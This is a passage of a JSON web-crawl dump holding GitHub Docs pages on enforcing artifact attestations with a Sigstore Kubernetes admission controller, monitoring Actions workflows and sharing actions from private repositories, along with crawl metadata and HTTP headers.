policies. To enable enforcement in a namespace, you can add the following label to the namespace:\nmetadata: labels: policy.sigstore.dev/include: \"true\" \nAfter the label is added, the GitHub artifact attestation policy will be enforced in the namespace.\nAlternatively, you may run:\nBash\nkubectl label namespace MY-NAMESPACE policy.sigstore.dev/include=true \nMatching images\nBy default, the policy installed with the trust-policies Helm chart will verify attestations for all images before admitting them into the cluster. If you only intend to enforce attestations for a subset of images, you can use the Helm values policy.images and policy.exemptImages to specify a list of images to match against. These values can be set to a list of glob patterns that match the image names. The globbing syntax uses Go filepath semantics, with the addition of ** to match any character sequence, including slashes.\nFor example, to enforce attestations for images that match the pattern ghcr.io/MY-ORGANIZATION/* and admit busybox without a valid attestation, you can run:\nBash\nhelm upgrade trust-policies --install --atomic \\ --namespace artifact-attestations \\ oci://ghcr.io/github/artifact-attestations-helm-charts/trust-policies \\ --version v0.6.2 \\ --set policy.enabled=true \\ --set policy.organization=MY-ORGANIZATION \\ --set-json 'policy.exemptImages=[\"index.docker.io/library/busybox**\"]' \\ --set-json 'policy.images=[\"ghcr.io/MY-ORGANIZATION/**\"]' \nAll patterns must use the fully-qualified name, even if the images originate from Docker Hub. In this example, if we want to exempt the image busybox, we must provide the full name including the domain and double-star glob to match all image versions: index.docker.io/library/busybox**.\nNote that any image you intend to admit must have a matching glob pattern in the policy.images list. If an image does not match any pattern, it will be rejected. Additionally, if an image matches both policy.images and policy.exemptImages, it will be rejected.\nAdvanced usage\nTo see the full set of options you may configure with the Helm chart, you can run either of the following commands. For policy controller options:\nBash\nhelm show values oci://ghcr.io/github/artifact-attestations-helm-charts/policy-controller --version v0.12.0-github12 \nFor trust policy options:\nBash\nhelm show values oci://ghcr.io/github/artifact-attestations-helm-charts/trust-policies --version v0.6.2 \nFor more information on the Sigstore Policy Controller, see the Sigstore Policy Controller documentation.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-using-artifact-attestations-enforcing-artifact-attestations-with-a-kubernetes-admission-lrnsh.html",
  "markdown": "# Enforcing artifact attestations with a Kubernetes admission controller\n\nUse an admission controller to enforce artifact attestations in your Kubernetes cluster.\n\n## [About Kubernetes admission controller](#about-kubernetes-admission-controller)\n\n[Artifact attestations](https://docs.github.com/en/actions/security-guides/using-artifact-attestations-to-establish-provenance-for-builds) enable you to create unfalsifiable provenance and integrity guarantees for the software you build. In turn, people who consume your software can verify where and how your software was built.\n\nKubernetes admission controllers are plugins that govern the behavior of the Kubernetes API server. They are commonly used to enforce security policies and best practices in a Kubernetes cluster.\n\nUsing the open source [Sigstore Policy Controller](https://docs.sigstore.dev/policy-controller/overview/) project you can add an admission controller to your Kubernetes cluster that can enforce artifact attestations. This way, you can ensure that only artifacts with valid attestations can be deployed.\n\nTo [install the controller](#getting-started-with-kubernetes-admission-controller), we offer [two Helm charts](https://github.com/github/artifact-attestations-helm-charts): one for deploying the Sigstore Policy Controller, and another for loading the GitHub trust root and a default policy.\n\n### [About image verification](#about-image-verification)\n\nWhen the Policy Controller is installed, it will intercept all image pull requests and verify the attestation for the image. The attestation must be stored in the image registry as an [OCI attached artifact](https://oras.land/docs/concepts/reftypes/) containing a [Sigstore Bundle](https://docs.sigstore.dev/about/bundle/) which contains the attestation and cryptographic material (e.g. certificates and signatures) used to verify the attestation. A verification process is then performed that ensures the image was built with the specified build provenance and matches any policies enabled by the cluster administrator.\n\nIn order for an image to be verifiable, it must have a valid provenance attestation in the registry, which can be done by enabling the `push-to-registry: true` attribute in the `actions/attest-build-provenance` action. See [Generating build provenance for container images](https://docs.github.com/en/actions/security-guides/using-artifact-attestations-to-establish-provenance-for-builds#generating-build-provenance-for-container-images) for more details on how to generate attestations for container images.\n\n### [About trust roots and policies](#about-trust-roots-and-policies)\n\nThe Sigstore Policy Controller is primarily configured with trust roots and policies, represented by the Custom Resources `TrustRoot` and `ClusterImagePolicy`. A `TrustRoot` represents a trusted distribution channel for the public key material used to verify attestations. A `ClusterImagePolicy` represents a policy for enforcing attestations on images.\n\nA `TrustRoot` may also contain a [TUF](https://theupdateframework.io/) repository root, making it possible for your cluster to continuously and securely receive updates to its trusted public key material. If left unspecified, a `ClusterImagePolicy` will by default use the open source Sigstore Public Good Instance's key material. When verifying attestations generated for private repositories, the `ClusterImagePolicy` must reference the GitHub `TrustRoot`.\n\n## [Getting started with Kubernetes admission controller](#getting-started-with-kubernetes-admission-controller)\n\nTo set up an admission controller for enforcing GitHub artifact attestations, you need to:\n\n1.  [Deploy the Sigstore Policy Controller](#deploy-the-sigstore-policy-controller).\n2.  [Add the GitHub `TrustRoot` and a `ClusterImagePolicy` to your cluster](#add-the-github-trustroot-and-a-clusterimagepolicy).\n3.  [Enable the policy in your namespace](#enable-the-policy-in-your-namespace).\n\n### [Deploy the Sigstore Policy Controller](#deploy-the-sigstore-policy-controller)\n\nWe have packaged the Sigstore Policy Controller as a [GitHub distributed Helm chart](https://github.com/github/artifact-attestations-helm-charts). Before you begin, ensure you have the following prerequisites:\n\n*   A Kubernetes cluster with version 1.27 or later\n*   [Helm](https://helm.sh/docs/intro/install/) 3.0 or later\n*   [kubectl](https://kubernetes.io/docs/tasks/tools/)\n\nFirst, install the Helm chart that deploys the Sigstore Policy Controller:\n\nBash\n\n```\nhelm upgrade policy-controller --install --atomic \\\n  --create-namespace --namespace artifact-attestations \\\n  oci://ghcr.io/github/artifact-attestations-helm-charts/policy-controller \\\n  --version v0.12.0-github12\n```\n\nThis installs the Policy Controller into the `artifact-attestations` namespace. At this point, no policies have been configured, and it will not enforce any attestations.\n\n### [Add the GitHub `TrustRoot` and a `ClusterImagePolicy`](#add-the-github-trustroot-and-a-clusterimagepolicy)\n\nOnce the policy controller has been deployed, you need to add the GitHub `TrustRoot` and a `ClusterImagePolicy` to your cluster. Use the Helm chart we provide to do this. Make sure to replace `MY-ORGANIZATION` with your GitHub organization's name (e.g., `github` or `octocat-inc`).\n\nBash\n\n```\nhelm upgrade trust-policies --install --atomic \\\n --namespace artifact-attestations \\\n oci://ghcr.io/github/artifact-attestations-helm-charts/trust-policies \\\n --version v0.6.2 \\\n --set policy.enabled=true \\\n --set policy.organization=MY-ORGANIZATION\n```\n\nYou've now installed the GitHub trust root, and an artifact attestation policy into your cluster. This policy will reject artifacts that have not originated from within your GitHub organization.\n\n### [Enable the policy in your namespace](#enable-the-policy-in-your-namespace)\n\nWarning\n\nThis policy will not be enforced until you specify which namespaces it should apply to.\n\nEach namespace in your cluster can independently enforce policies. To enable enforcement in a namespace, you can add the following label to the namespace:\n\n```\nmetadata:\n  labels:\n    policy.sigstore.dev/include: \"true\"\n```\n\nAfter the label is added, the GitHub artifact attestation policy will be enforced in the namespace.\n\nAlternatively, you may run:\n\nBash\n\n```\nkubectl label namespace MY-NAMESPACE policy.sigstore.dev/include=true\n```\n\n### [Matching images](#matching-images)\n\nBy default, the policy installed with the `trust-policies` Helm chart will verify attestations for all images before admitting them into the cluster. If you only intend to enforce attestations for a subset of images, you can use the Helm values `policy.images` and `policy.exemptImages` to specify a list of images to match against. These values can be set to a list of glob patterns that match the image names. The globbing syntax uses Go [filepath](https://pkg.go.dev/path/filepath#Match) semantics, with the addition of `**` to match any character sequence, including slashes.\n\nFor example, to enforce attestations for images that match the pattern `ghcr.io/MY-ORGANIZATION/*` and admit `busybox` without a valid attestation, you can run:\n\nBash\n\n```\nhelm upgrade trust-policies --install --atomic \\\n --namespace artifact-attestations \\\n oci://ghcr.io/github/artifact-attestations-helm-charts/trust-policies \\\n --version v0.6.2 \\\n --set policy.enabled=true \\\n --set policy.organization=MY-ORGANIZATION \\\n --set-json 'policy.exemptImages=[\"index.docker.io/library/busybox**\"]' \\\n --set-json 'policy.images=[\"ghcr.io/MY-ORGANIZATION/**\"]'\n```\n\nAll patterns must use the fully-qualified name, even if the images originate from Docker Hub. In this example, if we want to exempt the image `busybox`, we must provide the full name including the domain and double-star glob to match all image versions: `index.docker.io/library/busybox**`.\n\nNote that any image you intend to admit _must_ have a matching glob pattern in the `policy.images` list. If an image does not match any pattern, it will be rejected. Additionally, if an image matches both `policy.images` and `policy.exemptImages`, it will be rejected.\n\n### [Advanced usage](#advanced-usage)\n\nTo see the full set of options you may configure with the Helm chart, you can run either of the following commands. For policy controller options:\n\nBash\n\n```\nhelm show values oci://ghcr.io/github/artifact-attestations-helm-charts/policy-controller --version v0.12.0-github12\n```\n\nFor trust policy options:\n\nBash\n\n```\nhelm show values oci://ghcr.io/github/artifact-attestations-helm-charts/trust-policies --version v0.6.2\n```\n\nFor more information on the Sigstore Policy Controller, see the [Sigstore Policy Controller documentation](https://docs.sigstore.dev/policy-controller/overview/).",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 251,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-using-artifact-attestations-enforcing-artifact-attestations-with-a-kubernetes-admission",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-using-artifact-attestations-enforcing-artifact-attestations-with-a-kubernetes-admission",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-using-artifact-attestations-enforcing-artifact-attestations-with-a-kubernetes-admission",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-using-artifact-attestations-enforcing-artifact-attestations-with-a-kubernetes-admission",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-using-artifact-attestations-enforcing-artifact-attestations-with-a-kubernetes-admission"
    },
    "lengths": {
      "extractus": 12833,
      "readableText": 10824,
      "none": 33284,
      "readableTextIfPossible": 10824,
      "result": 10824,
      "markdown": 8745
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/about-monitoring-workflows",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/about-monitoring-workflows",
    "loadedTime": "2025-05-08T06:37:56.719Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/about-monitoring-workflows",
    "title": "About monitoring workflows - GitHub Docs",
    "description": "You can use the tools in GitHub Actions to monitor your workflows, metrics, and self-hosted runners.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "About monitoring workflows - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/about-monitoring-workflows"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/about-monitoring-workflows"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "8810:1F18CA:FB7A47:14427F5:681C513D",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:37:49 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686269.432577, VS0, VE286",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "25081",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "About monitoring workflows - GitHub Docs\nYou can use the tools in GitHub Actions to monitor your workflows, metrics, and self-hosted runners.\nMonitoring your workflows\nMonitoring your current jobs in your organization or enterprise\nTo identify any constraints with concurrency or queuing, you can check how many jobs are currently being processed on the GitHub-hosted runners in your organization or enterprise. For more information, see Monitoring your current jobs.\nUsing the visualization graph\nEvery workflow run generates a real-time graph that illustrates the run progress. You can use this graph to monitor and debug workflows. For example:\nFor more information, see Using the visualization graph.\nAdding a workflow status badge\nA status badge shows whether a workflow is currently failing or passing. A common place to add a status badge is in the README.md file of your repository, but you can add it to any web page you'd like. By default, badges display the status of your default branch. If there are no workflow runs on your default branch, it will display the status of the most recent run across all branches. You can display the status of a workflow run for a specific branch or event using the branch and event query parameters in the URL.\nFor more information, see Adding a workflow status badge.\nViewing job execution time\nTo identify how long a job took to run, you can view its execution time. For more information, see Viewing job execution time.\nViewing workflow run history\nYou can view the status of each job and step in a workflow. For more information, see Viewing workflow run history.\nMonitoring GitHub Actions metrics\nTo analyze the efficiency and reliability of your workflows using metrics, see Viewing GitHub Actions metrics.\nMonitoring self-hosted runners\nIf you use self-hosted runners, you can view their activity and diagnose common issues.\nFor more information, see Monitoring and troubleshooting self-hosted runners.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-about-monitoring-workflows-gpway.html",
  "markdown": "# About monitoring workflows - GitHub Docs\n\nYou can use the tools in GitHub Actions to monitor your workflows, metrics, and self-hosted runners.\n\n## [Monitoring your workflows](#monitoring-your-workflows)\n\n### [Monitoring your current jobs in your organization or enterprise](#monitoring-your-current-jobs-in-your-organization-or-enterprise)\n\nTo identify any constraints with concurrency or queuing, you can check how many jobs are currently being processed on the GitHub-hosted runners in your organization or enterprise. For more information, see [Monitoring your current jobs](https://docs.github.com/en/actions/using-github-hosted-runners/monitoring-your-current-jobs).\n\n### [Using the visualization graph](#using-the-visualization-graph)\n\nEvery workflow run generates a real-time graph that illustrates the run progress. You can use this graph to monitor and debug workflows. For example:\n\n![Screenshot of the visualization graph of a workflow run.](https://docs.github.com/assets/cb-63715/images/help/actions/workflow-graph.png)\n\nFor more information, see [Using the visualization graph](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/using-the-visualization-graph).\n\n### [Adding a workflow status badge](#adding-a-workflow-status-badge)\n\nA status badge shows whether a workflow is currently failing or passing. A common place to add a status badge is in the `README.md` file of your repository, but you can add it to any web page you'd like. By default, badges display the status of your default branch. If there are no workflow runs on your default branch, it will display the status of the most recent run across all branches. You can display the status of a workflow run for a specific branch or event using the `branch` and `event` query parameters in the URL.\n\n![Screenshot of a workflow status badge. From right to left it shows: the GitHub logo, workflow name (\"GitHub Actions Demo\"), and status (\"passing\").](https://docs.github.com/assets/cb-16218/images/help/repository/actions-workflow-status-badge.png)\n\nFor more information, see [Adding a workflow status badge](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/adding-a-workflow-status-badge).\n\n### [Viewing job execution time](#viewing-job-execution-time)\n\nTo identify how long a job took to run, you can view its execution time. For more information, see [Viewing job execution time](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/viewing-job-execution-time).\n\n### [Viewing workflow run history](#viewing-workflow-run-history)\n\nYou can view the status of each job and step in a workflow. For more information, see [Viewing workflow run history](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/viewing-workflow-run-history).\n\n## [Monitoring GitHub Actions metrics](#monitoring-github-actions-metrics)\n\nTo analyze the efficiency and reliability of your workflows using metrics, see [Viewing GitHub Actions metrics](https://docs.github.com/en/actions/administering-github-actions/viewing-github-actions-metrics).\n\n## [Monitoring self-hosted runners](#monitoring-self-hosted-runners)\n\nIf you use self-hosted runners, you can view their activity and diagnose common issues.\n\nFor more information, see [Monitoring and troubleshooting self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/monitoring-and-troubleshooting-self-hosted-runners).",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasMinWordsCrawleeHtmlToText",
    "totalLinks": 245,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-about-monitoring-workflows-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-about-monitoring-workflows-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-about-monitoring-workflows-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-about-monitoring-workflows-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-about-monitoring-workflows-readableTextIfPossibleHtml"
    },
    "lengths": {
      "extractus": 5678,
      "readableText": 4770,
      "none": 25141,
      "readableTextIfPossible": 25141,
      "result": 4770,
      "markdown": 3475
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/sharing-automations/sharing-actions-and-workflows-from-your-private-repository",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/sharing-automations/sharing-actions-and-workflows-from-your-private-repository",
    "loadedTime": "2025-05-08T06:37:54.210Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/sharing-automations/sharing-actions-and-workflows-from-your-private-repository",
    "title": "Sharing actions and workflows from your private repository - GitHub Docs",
    "description": "You can share an action or reusable workflow without publishing them publicly.",
    "author": null,
    "keywords": "Actions,Action development",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Sharing actions and workflows from your private repository - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/sharing-automations/sharing-actions-and-workflows-from-your-private-repository"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/sharing-automations/sharing-actions-and-workflows-from-your-private-repository"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "ED3E:205091:EDF0C8:136A9B5:681C513A",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:37:46 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686266.051869, VS0, VE344",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "24807",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Sharing actions and workflows from your private repository\nYou can share an action or reusable workflow without publishing them publicly.\nAbout GitHub Actions access to private repositories\nYou can share actions and reusable workflows from your private repository, without making them public, by allowing GitHub Actions workflows to access a private repository that contains the action or reusable workflow.\nAny actions or reusable workflows stored in the private repository can be used in workflows defined in other private repositories owned by the same organization or user. Actions and reusable workflows stored in private repositories cannot be used in public repositories.\nWarning\nIf you make a private repository accessible to GitHub Actions workflows in other repositories, outside collaborators on the other repositories can indirectly access the private repository, even though they do not have direct access to these repositories. The outside collaborators can view logs for workflow runs when actions or workflows from the private repository are used.\nTo allow runners to download these actions, GitHub passes a scoped installation token to the runner. This token has read access to the repository, and automatically expires after one hour.\nSharing actions and workflows from your private repository\nStore the action or reusable workflow in a private repository. For more information, see About repositories.\nConfigure the repository to allow access to workflows in other private repositories. For more information, see Managing GitHub Actions settings for a repository.\nFurther reading\nReusing workflows",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-sharing-actions-and-workflows-from-your-private-repository-ssj8yh.html",
  "markdown": "# Sharing actions and workflows from your private repository\n\nYou can share an action or reusable workflow without publishing them publicly.\n\n## [About GitHub Actions access to private repositories](#about-github-actions-access-to-private-repositories)\n\nYou can share actions and reusable workflows from your private repository, without making them public, by allowing GitHub Actions workflows to access a private repository that contains the action or reusable workflow.\n\nAny actions or reusable workflows stored in the private repository can be used in workflows defined in other private repositories owned by the same organization or user. Actions and reusable workflows stored in private repositories cannot be used in public repositories.\n\nWarning\n\n*   If you make a private repository accessible to GitHub Actions workflows in other repositories, outside collaborators on the other repositories can indirectly access the private repository, even though they do not have direct access to these repositories. The outside collaborators can view logs for workflow runs when actions or workflows from the private repository are used.\n*   To allow runners to download these actions, GitHub passes a scoped installation token to the runner. This token has read access to the repository, and automatically expires after one hour.\n\n## [Sharing actions and workflows from your private repository](#sharing-actions-and-workflows-from-your-private-repository)\n\n1.  Store the action or reusable workflow in a private repository. For more information, see [About repositories](https://docs.github.com/en/repositories/creating-and-managing-repositories/about-repositories#about-repository-visibility).\n2.  Configure the repository to allow access to workflows in other private repositories. For more information, see [Managing GitHub Actions settings for a repository](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#allowing-access-to-components-in-a-private-repository).\n\n## [Further reading](#further-reading)\n\n*   [Reusing workflows](https://docs.github.com/en/actions/using-workflows/reusing-workflows)",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 228,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-sharing-actions-and-workflows-from-your-private-repository-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-sharing-actions-and-workflows-from-your-private-repository-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-sharing-actions-and-workflows-from-your-private-repository-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-sharing-actions-and-workflows-from-your-private-repository-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-sharing-actions-and-workflows-from-your-private-repository-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 2935,
      "readableText": 2787,
      "none": 18787,
      "readableTextIfPossible": 18787,
      "result": 2787,
      "markdown": 2226
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/sharing-automations/sharing-actions-and-workflows-with-your-organization",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/sharing-automations/sharing-actions-and-workflows-with-your-organization",
    "loadedTime": "2025-05-08T06:38:00.035Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/sharing-automations/sharing-actions-and-workflows-with-your-organization",
    "title": "Sharing actions and workflows with your organization - GitHub Docs",
    "description": "You can share an action or reusable workflow with your organization without publishing the action or workflow publicly.",
    "author": null,
    "keywords": "Actions,Action development",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Sharing actions and workflows with your organization - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/sharing-automations/sharing-actions-and-workflows-with-your-organization"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/sharing-automations/sharing-actions-and-workflows-with-your-organization"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "76D2:145A9D:101D860:14A92BB:681C5141",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:37:53 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686273.024759, VS0, VE308",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "24831",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
